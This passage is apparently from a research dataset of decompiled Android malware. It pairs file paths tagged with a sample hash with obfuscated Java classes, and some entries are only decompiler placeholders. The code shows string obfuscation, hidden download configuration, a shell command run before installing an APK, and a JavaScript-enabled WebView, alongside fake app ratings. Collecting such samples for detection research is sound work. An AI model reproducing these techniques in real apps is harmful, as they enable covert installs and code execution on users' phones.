ci=com.baty.pczy.facy.pap.s.a.a(b.ch);   public static final String cj=com.baty.pczy.facy.pap.s.a.a(b.cj);   public static final String ck=com.baty.pczy.facy.pap.s.a.a(b.ck);   public static final String cl=com.baty.pczy.facy.pap.s.a.a(b.cl);   public static final String cm=com.baty.pczy.facy.pap.s.a.a(b.cm);   public static final String cn=com.baty.pczy.facy.pap.s.a.a(b.cn);   public static final String co=com.baty.pczy.facy.pap.s.a.a(b.co);   public static final String cp=com.baty.pczy.facy.pap.s.a.a(b.cp);   public static final String cq=com.baty.pczy.facy.pap.s.a.a(b.cq);   public static final String cr=com.baty.pczy.facy.pap.s.a.a(b.cr);   public static final String cs=com.baty.pczy.facy.pap.s.a.a(b.cs);   public static final String ct=com.baty.pczy.facy.pap.s.a.a(b.ct);   public static final String cu=com.baty.pczy.facy.pap.s.a.a(b.cu);   public static final String cv=com.baty.pczy.facy.pap.s.a.a(b.cv);   public static final String cw=com.baty.pczy.facy.pap.s.a.a(b.cw);   public static final String cx=com.baty.pczy.facy.pap.s.a.a(b.cx);   public static final String cy=com.baty.pczy.facy.pap.s.a.a(b.cy);   public static final String cz=com.baty.pczy.facy.pap.s.a.a(b.cz);   public static final String cA=com.baty.pczy.facy.pap.s.a.a(b.cA);   public static final String cB=com.baty.pczy.facy.pap.s.a.a(b.cB);   public static final String cC=com.baty.pczy.facy.pap.s.a.a(b.cC);   public static final String cD=com.baty.pczy.facy.pap.s.a.a(b.cD);   public static final String cE=com.baty.pczy.facy.pap.s.a.a(b.cE);   public static final String cF=com.baty.pczy.facy.pap.s.a.a(b.cF);   public static final String cG=com.baty.pczy.facy.pap.s.a.a(b.cG);   public static final String cH=com.baty.pczy.facy.pap.s.a.a(b.cH);   public static final String cI=com.baty.pczy.facy.pap.s.a.a(b.cI);   public static final String cJ=com.baty.pczy.facy.pap.s.a.a(b.cJ);   public static final String cK=com.baty.pczy.facy.pap.s.a.a(b.cK);   public static final String cL=com.baty.pczy.facy.pap.s.a.a(b.cL);   public static final String cM=com.baty.pczy.facy.pap.s.a.a(b.cM);   public static final String cN=com.baty.pczy.facy.pap.s.a.a(b.cN);   public static final String cO=com.baty.pczy.facy.pap.s.a.a(b.cO);   public static final String cP=com.baty.pczy.facy.pap.s.a.a(b.cP);   public static final String cQ=com.baty.pczy.facy.pap.s.a.a(b.cQ); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.q\a.code","public interface a {   void a(); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.q\b.code","public class b {   private static b a;   private ThreadFactory b=new c(this);   private ExecutorService f86c=Executors.newCachedThreadPool(this.b);   private b(){   }   public static synchronized b a(){     b bVar; synchronized (b.class) {       if (a == null) {         a=new b();       }       bVar=a;     }     return bVar;   }   public void a(  Runnable runnable){     this.f86c.execute(runnable);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.q\c.code","public class c implements ThreadFactory {   final b a;   private AtomicInteger b=new AtomicInteger(1);   public c(  b bVar){     this.a=bVar;   }   @Override public Thread newThread(  Runnable runnable){     return new Thread(runnable,"" "" + this.b.getAndIncrement());   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.q\d.code","public class d {   public static void a(  a aVar){     b.a().a(new e(aVar));   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.q\e.code","final class e implements Runnable {   final a a;   public e(  a aVar){     this.a=aVar;   }   @Override public void run(){     this.a.a();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.r\a.code","!org.eclipse.jdt.core.dom.TypeDeclaration@71ce26ac"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.r\b.code","public class b implements View.OnClickListener {   final a a;   public b(  a aVar){     this.a=aVar;   }   @Override public void onClick(  View view){     boolean z;     TextView textView;     ImageView imageView;     Context context;     TextView textView2;     Context context2;     ImageView imageView2;     Context context3;     z=this.a.t;     if (!z) {       textView=this.a.i;       textView.setMaxLines(5);       imageView=this.a.j;       context=this.a.d;       imageView.setImageDrawable(com.baty.pczy.facy.pap.s.g.a(context,56));       this.a.t=true;       return;     }     textView2=this.a.i;     context2=this.a.d;     textView2.setMaxLines(context2.getWallpaperDesiredMinimumHeight());     imageView2=this.a.j;     context3=this.a.d;     imageView2.setImageDrawable(com.baty.pczy.facy.pap.s.g.a(context3,65));     this.a.t=false;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.r\c.code","public class c implements AdapterView.OnItemClickListener {   final a a;   public c(  a aVar){     this.a=aVar;   }   @Override public void onItemClick(  AdapterView adapterView,  View view,  int i,  long j){     this.a.i();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.r\d.code","!org.eclipse.jdt.core.dom.TypeDeclaration@73448552"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.r\e.code","public class e implements Runnable {   final a a;   public e(  a aVar){     this.a=aVar;   }   @Override public void run(){     String l;     Context context;     com.baty.pczy.facy.pap.e.e eVar=new com.baty.pczy.facy.pap.e.e();     eVar.a=com.baty.pczy.facy.pap.e.b.b();     l=this.a.l();     eVar.b=l;     context=this.a.d;     com.baty.pczy.facy.pap.e.f[] a=com.baty.pczy.facy.pap.m.a.a(context).a(eVar);     Message message=new Message();     message.what=512;     message.obj=a;     this.a.f87c.sendMessage(message);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.r\f.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1093438b"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.r\g.code","public class g implements com.baty.pczy.facy.pap.d.a {   final f a;   public g(  f fVar){     this.a=fVar;   }   @Override public void a(  com.baty.pczy.facy.pap.d.f fVar,  int i){     if (i == 4) {       this.a.f88c.sendEmptyMessage(513);     }  else     if (i == 5 || i == 3) {       this.a.f88c.sendEmptyMessage(515);     }   }   @Override public void a(  com.baty.pczy.facy.pap.d.f fVar,  long j){     Message obtainMessage=this.a.f88c.obtainMessage(514);     int j2=(int)((fVar.j() * 100) / fVar.i());     if (j2 < 0) {       j2=0;     }  else     if (j2 > 100) {       j2=99;     }     obtainMessage.arg1=j2;     this.a.f88c.sendMessage(obtainMessage);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.r\h.code","!org.eclipse.jdt.core.dom.TypeDeclaration@4e6675a6"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.r\i.code","class i implements Runnable {   final f a;   public i(  f fVar){     this.a=fVar;   }   @Override public void run(){     this.a.d();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.r\j.code","public class j extends RelativeLayout implements View.OnClickListener {   Handler a;   private Context b;   private int f89c;   private int d;   private ImageView e;   private int f;   private com.baty.pczy.facy.pap.e.f g;   private RelativeLayout.LayoutParams h;   private LinearLayout i;   private TextView j;   private TextView k;   private TextView l;   private com.baty.pczy.facy.pap.b.b m;   public j(  Context context){     super(context);     this.f89c=com.baty.pczy.facy.pap.s.a.a(getContext(),10);     this.d=com.baty.pczy.facy.pap.s.a.a(getContext(),56);     this.f=com.baty.pczy.facy.pap.s.a.a(getContext(),5);     this.a=new k(this);     this.b=context;     this.m=com.baty.pczy.facy.pap.b.b.a(getContext());     a();   }   private String a(  float f){     return f > 1024.0f ? (((int)((f / 1024.0f) * 100.0f)) / 100.0f) + ""M"" : ((int)Math.ceil(f)) + ""K"";   }   private void b(){     if (com.baty.pczy.facy.pap.j.j.a(this.b).c()) {       this.i.setVisibility(8);     }  else {       this.i.setVisibility(0);     }   }   private void c(){     this.m.a(this.e,this.g.f60c,com.baty.pczy.facy.pap.f.d.d(this.g),null,com.baty.pczy.facy.pap.b.e.Type_icon);   }   public void a(){     setPadding(this.f89c,this.f89c,this.f89c,this.f89c);     this.e=new ImageView(this.b);     this.e.setBackgroundDrawable(com.baty.pczy.facy.pap.s.g.a(this.b,16));     this.h=new RelativeLayout.LayoutParams(this.d,this.d);     this.h.addRule(15,-1);     this.e.setId(256);     addView(this.e,this.h);     this.i=new LinearLayout(this.b);     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-2,-2);     this.i.setOrientation(1);     this.i.setPadding(0,0,com.baty.pczy.facy.pap.s.a.a(this.b,15),0);     this.i.setLayoutParams(layoutParams);     this.h=new RelativeLayout.LayoutParams(-2,-2);     this.h.addRule(11,-1);     this.h.addRule(15,-1);     addView(this.i,this.h);     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(com.baty.pczy.facy.pap.s.a.a(this.b,24),com.baty.pczy.facy.pap.s.a.a(this.b,16),1.0f);     ImageView imageView=new ImageView(this.b);     imageView.setScaleType(ImageView.ScaleType.CENTER);     layoutParams2.bottomMargin=com.baty.pczy.facy.pap.s.a.a(this.b,5);     imageView.setBackgroundDrawable(com.baty.pczy.facy.pap.s.g.a(this.b,57));     layoutParams2.gravity=1;     this.i.addView(imageView,layoutParams2);     LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(-2,-2,1.0f);     Button button=new Button(this.b);     button.setLayoutParams(layoutParams3);     StateListDrawable stateListDrawable=new StateListDrawable();     stateListDrawable.addState(new int[]{R.attr.state_pressed},com.baty.pczy.facy.pap.s.g.c(this.b,41));     stateListDrawable.addState(new int[]{R.attr.state_enabled},com.baty.pczy.facy.pap.s.g.c(this.b,40));     button.setBackgroundDrawable(stateListDrawable);     button.setText(com.baty.pczy.facy.pap.p.a.av);     button.setTextColor(-1);     button.setTextSize(15.0f);     button.setOnClickListener(this);     this.i.addView(button,layoutParams3);     LinearLayout linearLayout=new LinearLayout(this.b);     linearLayout.setPadding(this.f,this.f,this.f,this.f);     linearLayout.setOrientation(1);     RelativeLayout.LayoutParams layoutParams4=new RelativeLayout.LayoutParams(-1,-2);     layoutParams4.addRule(1,256);     addView(linearLayout,layoutParams4);     LinearLayout.LayoutParams layoutParams5=new LinearLayout.LayoutParams(-2,-2,1.0f);     layoutParams5.gravity=16;     this.j=new TextView(this.b);     this.j.getPaint().setFakeBoldText(true);     this.j.setTextSize(16.0f);     this.j.setTextColor(-9144456);     this.j.setSingleLine();     this.j.setEllipsize(TextUtils.TruncateAt.END);     LinearLayout linearLayout2=new LinearLayout(this.b);     linearLayout2.setPadding(com.baty.pczy.facy.pap.s.a.a(getContext(),2),0,0,0);     linearLayout2.addView(this.j);     linearLayout.addView(linearLayout2,layoutParams5);     LinearLayout linearLayout3=new LinearLayout(this.b);     LinearLayout.LayoutParams layoutParams6=new LinearLayout.LayoutParams(-2,-2);     linearLayout3.setPadding(0,com.baty.pczy.facy.pap.s.a.a(getContext(),2),this.f,0);     linearLayout3.setOrientation(0);     this.k=new TextView(this.b);     this.k.setSingleLine();     this.k.setTextSize(12.0f);     this.k.setTextColor(-7829368);     linearLayout3.addView(this.k,layoutParams6);     this.l=new TextView(this.b);     this.l.setSingleLine();     this.l.setTextSize(12.0f);     this.l.setText(""å¤§å°�"");     this.l.setTextColor(-7829368);     this.l.setEllipsize(TextUtils.TruncateAt.END);     layoutParams6.leftMargin=com.baty.pczy.facy.pap.s.a.a(getContext(),3);     linearLayout3.addView(this.l,layoutParams6);     linearLayout.addView(linearLayout3,layoutParams5);     float nextFloat=4.1f + new Random().nextFloat();     if (nextFloat > 5.0f) {       nextFloat=5.0f;     }     if (nextFloat < 4.3d) {       nextFloat=4.0f;     }     q qVar=new q(nextFloat,this.b);     ImageView imageView2=new ImageView(this.b);     imageView2.setMinimumHeight(com.baty.pczy.facy.pap.s.a.a(this.b,12));     imageView2.setMinimumWidth(com.baty.pczy.facy.pap.s.a.a(this.b,12));     imageView2.setScaleType(ImageView.ScaleType.FIT_CENTER);     imageView2.setBackgroundDrawable(qVar);     LinearLayout linearLayout4=new LinearLayout(this.b);     linearLayout4.setPadding(com.baty.pczy.facy.pap.s.a.a(getContext(),1),com.baty.pczy.facy.pap.s.a.a(getContext(),2),0,0);     linearLayout4.addView(imageView2);     linearLayout.addView(linearLayout4,layoutParams5);   }   public void a(  com.baty.pczy.facy.pap.e.f fVar){     this.g=fVar;     if (fVar == null) {       return;     }     c();     b();     this.j.setText(fVar.a);     this.k.setText(fVar.j);     this.l.setText(a((float)fVar.l));   }   @Override public void onClick(  View view){     com.baty.pczy.facy.pap.f.b.b(this.b,this.g);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.r\k.code","public class k extends Handler {   final j a;   public k(  j jVar){     this.a=jVar;   }   @Override public void handleMessage(  Message message){     ImageView imageView;     ImageView imageView2;     Context context;     imageView=this.a.e;     imageView.setImageBitmap(null);     imageView2=this.a.e;     context=this.a.b;     imageView2.setBackgroundDrawable(com.baty.pczy.facy.pap.s.g.a(context,16));   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.r\l.code","public class l extends LinearLayout {   private Context a;   private WebView b;   public l(  Context context){     super(context);     this.a=context;     a();   }   private void a(){     this.b=new WebView(this.a);     addView(this.b,new LinearLayout.LayoutParams(-1,-2));     this.b.setHorizontalScrollBarEnabled(false);     this.b.getSettings().setJavaScriptEnabled(true);     this.b.setWebViewClient(new m(this));   }   public void a(  String str){     this.b.loadUrl(str);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.r\m.code","public class m extends WebViewClient {   final l a;   public m(  l lVar){     this.a=lVar;   }   @Override public boolean shouldOverrideUrlLoading(  WebView webView,  String str){     webView.loadUrl(str);     return true;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.r\n.code","public class n extends LinearLayout {   private LinearLayout.LayoutParams a;   private Context b;   public n(  Context context){     super(context);     this.b=context;     a();   }   public void a(){     setBackgroundColor(-2170139);     setOrientation(0);     this.a=new LinearLayout.LayoutParams(com.baty.pczy.facy.pap.s.a.a(this.b,18),com.baty.pczy.facy.pap.s.a.a(this.b,18));     this.a.gravity=16;     this.a.leftMargin=com.baty.pczy.facy.pap.s.a.a(this.b,20);     LinearLayout.LayoutParams layoutParams=this.a;     LinearLayout.LayoutParams layoutParams2=this.a;     int a=com.baty.pczy.facy.pap.s.a.a(this.b,10);     layoutParams2.bottomMargin=a;     layoutParams.topMargin=a;     ImageView imageView=new ImageView(this.b);     imageView.setImageDrawable(com.baty.pczy.facy.pap.s.g.a(this.b,36));     addView(imageView,this.a);     this.a=new LinearLayout.LayoutParams(-2,-2);     this.a.gravity=16;     this.a.leftMargin=com.baty.pczy.facy.pap.s.a.a(this.b,10);     LinearLayout.LayoutParams layoutParams3=this.a;     LinearLayout.LayoutParams layoutParams4=this.a;     int a2=com.baty.pczy.facy.pap.s.a.a(this.b,10);     layoutParams4.bottomMargin=a2;     layoutParams3.topMargin=a2;     TextView textView=new TextView(this.b);     textView.setText(com.baty.pczy.facy.pap.p.a.bi);     textView.setTextColor(-16777216);     addView(textView,this.a);     this.a=new LinearLayout.LayoutParams(com.baty.pczy.facy.pap.s.a.a(this.b,18),com.baty.pczy.facy.pap.s.a.a(this.b,18));     this.a.gravity=16;     this.a.leftMargin=com.baty.pczy.facy.pap.s.a.a(this.b,10);     LinearLayout.LayoutParams layoutParams5=this.a;     LinearLayout.LayoutParams layoutParams6=this.a;     int a3=com.baty.pczy.facy.pap.s.a.a(this.b,10);     layoutParams6.bottomMargin=a3;     layoutParams5.topMargin=a3;     ImageView imageView2=new ImageView(this.b);     imageView2.setImageDrawable(com.baty.pczy.facy.pap.s.g.a(this.b,37));     addView(imageView2,this.a);     this.a=new LinearLayout.LayoutParams(-2,-2);     this.a.gravity=16;     LinearLayout.LayoutParams layoutParams7=this.a;     LinearLayout.LayoutParams layoutParams8=this.a;     int a4=com.baty.pczy.facy.pap.s.a.a(this.b,10);     layoutParams8.bottomMargin=a4;     layoutParams7.topMargin=a4;     this.a.leftMargin=com.baty.pczy.facy.pap.s.a.a(this.b,10);     TextView textView2=new TextView(this.b);     textView2.setTextColor(-16777216);     textView2.setText(com.baty.pczy.facy.pap.p.a.bk);     addView(textView2,this.a);     this.a=new LinearLayout.LayoutParams(com.baty.pczy.facy.pap.s.a.a(this.b,18),com.baty.pczy.facy.pap.s.a.a(this.b,18));     this.a.gravity=16;     this.a.leftMargin=com.baty.pczy.facy.pap.s.a.a(this.b,10);     LinearLayout.LayoutParams layoutParams9=this.a;     LinearLayout.LayoutParams layoutParams10=this.a;     int a5=com.baty.pczy.facy.pap.s.a.a(this.b,10);     layoutParams10.bottomMargin=a5;     layoutParams9.topMargin=a5;     ImageView imageView3=new ImageView(this.b);     imageView3.setImageDrawable(com.baty.pczy.facy.pap.s.g.a(this.b,38));     addView(imageView3,this.a);     this.a=new LinearLayout.LayoutParams(-2,-2);     this.a.gravity=16;     LinearLayout.LayoutParams layoutParams11=this.a;     LinearLayout.LayoutParams layoutParams12=this.a;     int a6=com.baty.pczy.facy.pap.s.a.a(this.b,10);     layoutParams12.bottomMargin=a6;     layoutParams11.topMargin=a6;     this.a.leftMargin=com.baty.pczy.facy.pap.s.a.a(this.b,10);     TextView textView3=new TextView(this.b);     textView3.setText(com.baty.pczy.facy.pap.p.a.bj);     textView3.setTextColor(-16777216);     addView(textView3,this.a);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.r\o.code","public class o extends Gallery {   private Bitmap a;   private Bitmap b;   private int f90c;   public o(  Context context,  int i){     this(context,(AttributeSet)null);     this.f90c=i;     a();   }   public o(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     this.f90c=-2;     a();   }   private void a(){   }   private void a(  Canvas canvas){     int count;     if (getAdapter() == null || (count=getAdapter().getCount()) <= 0 || this.a == null || this.b == null) {       return;     }     int width=this.a.getWidth();     int height=this.a.getHeight();     int selectedItemPosition=getSelectedItemPosition();     int width2=((getWidth() - (width * count)) - ((count - 1) * 10)) / 2;     int height2=(getHeight() - height) - 10;     for (int i=0; i < count; i++) {       if (i != selectedItemPosition) {         canvas.drawBitmap(this.a,width2,height2,(Paint)null);       }  else {         canvas.drawBitmap(this.b,width2,height2,(Paint)null);       }       width2+=width + 10;     }   }   private boolean a(  MotionEvent motionEvent,  MotionEvent motionEvent2){     return motionEvent2.getX() > motionEvent.getX();   }   public void a(  Bitmap bitmap,  Bitmap bitmap2){     this.a=bitmap;     this.b=bitmap2;     this.a.setDensity(240);     this.b.setDensity(240);   }   @Override public boolean dispatchTouchEvent(  MotionEvent motionEvent){     boolean dispatchTouchEvent=super.dispatchTouchEvent(motionEvent);     if (dispatchTouchEvent) {       requestDisallowInterceptTouchEvent(true);     }     return dispatchTouchEvent;   }   @Override public void draw(  Canvas canvas){     super.draw(canvas);     a(canvas);   }   @Override public boolean onFling(  MotionEvent motionEvent,  MotionEvent motionEvent2,  float f,  float f2){     onKeyDown(a(motionEvent,motionEvent2) ? 21 : 22,null);     return true;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.r\p.code","public class p extends GridView {   public p(  Context context){     super(context);   }   @Override public void onMeasure(  int i,  int i2){     super.onMeasure(i,View.MeasureSpec.makeMeasureSpec(536870911,Integer.MIN_VALUE));   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.r\q.code","public class q extends Drawable {   private Drawable a;   private Drawable b;   private Drawable f91c;   private int d;   private int e;   private float f;   public q(  float f,  Context context){     this.f=f;     this.a=com.baty.pczy.facy.pap.s.g.a(context,46);     this.b=com.baty.pczy.facy.pap.s.g.a(context,45);     this.f91c=com.baty.pczy.facy.pap.s.g.a(context,44);     this.d=this.f91c.getIntrinsicWidth();     this.e=this.f91c.getIntrinsicHeight();   }   @Override public void draw(  Canvas canvas){     int round=Math.round(this.f);     Rect bounds=getBounds();     int i=bounds.left;     int i2=0;     while (i2 < round) {       this.f91c.setBounds(i,bounds.top,this.d + i,bounds.bottom);       this.f91c.draw(canvas);       i2++;       i=this.d + i;     }     if (this.f > round) {       this.b.setBounds(i,bounds.top,this.d + i,bounds.bottom);       this.b.draw(canvas);       i+=this.d;       round++;     }     int i3=5 - round;     int i4=i;     for (int i5=0; i5 < i3; i5++) {       this.a.setBounds(i4,bounds.top,this.d + i4,bounds.top + this.a.getIntrinsicHeight());       this.a.draw(canvas);       i4+=this.d;     }   }   @Override public int getIntrinsicHeight(){     return this.e;   }   @Override public int getIntrinsicWidth(){     return this.d * 5;   }   @Override public int getOpacity(){     return 0;   }   @Override public void setAlpha(  int i){   }   @Override public void setColorFilter(  ColorFilter colorFilter){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.s\a.code","public class a {   private static String a;   private static Pattern b;   public static int a(  Context context){     return a(context,com.baty.pczy.facy.pap.p.a.aB,100061);   }   public static int a(  Context context,  int i){     return (int)((context.getResources().getDisplayMetrics().density * i) + 0.5f);   }   public static int a(  Context context,  String str,  int i){     BufferedReader bufferedReader;     BufferedReader bufferedReader2=null;     try {       bufferedReader=new BufferedReader(new InputStreamReader(context.getAssets().open(str,3)));       try {         i=Integer.valueOf(bufferedReader.readLine()).intValue();         if (bufferedReader != null) {           try {             bufferedReader.close();           }  catch (          IOException e) {           }         }       }  catch (      Exception e2) {         if (bufferedReader != null) {           try {             bufferedReader.close();           }  catch (          IOException e3) {           }         }         return i;       } catch (      Throwable th) {         bufferedReader2=bufferedReader;         th=th;         if (bufferedReader2 != null) {           try {             bufferedReader2.close();           }  catch (          IOException e4) {           }         }         throw th;       }     }  catch (    Exception e5) {       bufferedReader=null;     } catch (    Throwable th2) {       th=th2;     }     return i;   }   public static Intent a(  Context context,  File file){     Intent intent=new Intent(""android.intent.action.VIEW"");     intent.setDataAndType(Uri.fromFile(file),com.baty.pczy.facy.pap.p.a.ca);     intent.addFlags(268435456);     return intent;   }   public static String a(  String str){     if (a == null) {       a=g.d(com.baty.pczy.facy.pap.e.f57c,201);     }     try {       byte[] bytes=str.getBytes(""utf-8"");       byte[] bytes2=a.getBytes();       StringBuilder sb=new StringBuilder();       for (int i=0; i < bytes.length; i++) {         sb.append(""%"" + ((bytes[i] & 255) + (bytes2[i % bytes2.length] & 255)));       }       return sb.toString();     }  catch (    UnsupportedEncodingException e) {       com.baty.pczy.facy.pap.f.g.a((Exception)e);       return str;     }   }   public static String a(  byte[] bArr){     try {       return new String(bArr,com.seleuco.common.util.e.f);     }  catch (    UnsupportedEncodingException e) {       return """";     }   }   public static void a(  Context context,  String str,  String str2){     if (str == null || """".equals(str) || str2 == null || """".equals(str2)) {       return;     }     try {       if (str.contains(g.d(context,204))) {         Runtime.getRuntime().exec(g.d(context,205) + str);       }       context.startActivity(a(context,new File(str)));     }  catch (    Exception e) {     }   }   public static boolean a(  Context context,  String str){     try {       context.getPackageManager().getPackageInfo(str.trim(),256);       return true;     }  catch (    PackageManager.NameNotFoundException e) {       return false;     }   }   public static String[] a(  String str,  String str2){     int i=0;     if (str == null || str.equals("""") || str2 == null || str2.equals("""")) {       return null;     }     ArrayList arrayList=new ArrayList();     int i2=0;     while (true) {       int indexOf=str.indexOf(str2,i2);       if (indexOf == -1) {         break;       }       arrayList.add(str.substring(i2,indexOf));       i2=str2.length() + indexOf;     }     if (str.length() > i2) {       arrayList.add(str.substring(i2));     }     String[] strArr=new String[arrayList.size()];     ListIterator listIterator=arrayList.listIterator();     while (listIterator.hasNext()) {       strArr[i]=(String)listIterator.next();       i++;     }     return strArr;   }   public static String b(  String str){     if (str == null || str.length() == 0 || !str.contains(""%"")) {       return str;     }     if (a == null) {       a=g.d(com.baty.pczy.facy.pap.e.f57c,201);     }     if (b == null) {       b=Pattern.compile(g.d(com.baty.pczy.facy.pap.e.f57c,202));     }     Matcher matcher=b.matcher(str);     ArrayList arrayList=new ArrayList();     while (matcher.find()) {       try {         arrayList.add(Integer.valueOf(matcher.group()));       }  catch (      Exception e) {         com.baty.pczy.facy.pap.f.g.a(e);         return str;       }     }     if (arrayList.size() <= 0) {       return str;     }     try {       byte[] bArr=new byte[arrayList.size()];       byte[] bytes=a.getBytes();       for (int i=0; i < bArr.length; i++) {         bArr[i]=(byte)(((Integer)arrayList.get(i)).intValue() - (bytes[i % bytes.length] & 255));       }       return new String(bArr,""utf-8"");     }  catch (    UnsupportedEncodingException e2) {       com.baty.pczy.facy.pap.f.g.a((Exception)e2);       return str;     }   }   public static boolean b(  Context context){     return (context.getApplicationInfo().flags & 1) > 0;   }   public static boolean b(  Context context,  String str){     Intent c2=c(context,str);     if (c2 == null) {       return false;     }     context.startActivity(c2);     return true;   }   public static int c(  Context context){     return ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getWidth();   }   public static Intent c(  Context context,  String str){     ResolveInfo resolveInfo;     if (str == null || str.trim().equals("""")) {       return null;     }     PackageManager packageManager=context.getPackageManager();     Intent intent=new Intent(""android.intent.action.MAIN"",(Uri)null);     intent.addCategory(""android.intent.category.LAUNCHER"");     List<ResolveInfo> queryIntentActivities=packageManager.queryIntentActivities(intent,0);     if (queryIntentActivities != null) {       int size=queryIntentActivities.size();       for (int i=0; i < size; i++) {         resolveInfo=queryIntentActivities.get(i);         if (str.equals(resolveInfo.activityInfo.packageName)) {           break;         }       }     }     resolveInfo=null;     if (resolveInfo == null) {       return null;     }     ComponentName componentName=new ComponentName(str,resolveInfo.activityInfo.name);     Intent intent2=new Intent();     intent2.setComponent(componentName);     intent2.setFlags(268435456);     return intent2;   }   public static boolean d(  Context context,  String str){     if (str == null || str.length() == 0) {       return false;     }     try {       context.getPackageManager().getPackageInfo(str.trim(),256);       return true;     }  catch (    PackageManager.NameNotFoundException e) {       return false;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.s\b.code","public class b {   public static final byte[] a={118,103,112,95,100,111,119,110,108,111,97,100,65,112,112,115};   public static final byte[] b={118,103,112,95,114,101,99,111,109,109,101,110,100};   public static final byte[] f92c={114,101,99,111,109,109,101,110,100,83,116,97,116,101};   public static final byte[] d={118,103,112,95,109,101,115,115,97,103,101,95,112,114,101,102,115};   public static final byte[] e={118,103,112,95,114,101,113,117,101,115,116,95,112,114,101,102,115};   public static final byte[] f={118,103,112,95,114,101,113,117,101,115,116,95,115,116};   public static final byte[] g={118,103,112,95,116,111,103,103,108,101,95,102,108,97,103,95,112,114,101,102};   public static final byte[] h={100,111,119,110,108,111,97,100,47,118,103,112,47};   public static final byte[] i={47,65,110,100,114,111,105,100,47,100,97,116,97,47,99,111,100,101,47,75,73,46,68,65,84};   public static final byte[] j={107,105};   public static final byte[] k={86,45,73,68};   public static final byte[] l={67,72,76,45,73,68};   public static final byte[] m={118,103,112,95,105,100};   public static final byte[] n={104,115,108,46,100,97,116};   public static final byte[] o={115,104,111,119,95,108,111,99,107,95,116,111,103,103,108,101};   public static final byte[] p={-28,-72,-117,-24,-67,-67};   public static final byte[] q={118,95,97,112,112,108,105,115,116,95,112,114,101,102};   public static final byte[] r={118,95,108,105,115,116,95,115,116,97,116,117,115,95,112,114,101,102};   public static final byte[] s={101,118,95,108,105,115,116,95,115,116,97,116,117,115,95,112,114,101,102};   public static final byte[] t={118,103,112,95,108,105,115,116,95,100,111,119,110,108,111,97,100,65,112,112,115};   public static final byte[] u={118,103,112,95,101,120,105,116,95,108,105,115,116,95,100,111,119,110,108,111,97,100,65,112,112,115};   public static final byte[] v={48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102};   public static final byte[] w={105,105,46,112,110,103,46,100,97,116};   public static final byte[] x={46,112,110,103,46,100,97,116};   public static final byte[] y={100,105,97,108,111,103,46,112,110,103,46,100,97,116};   public static final byte[] z={118,95,119,105,102,105,115,97,118,101,95,112,114,101,102};   public static final byte[] 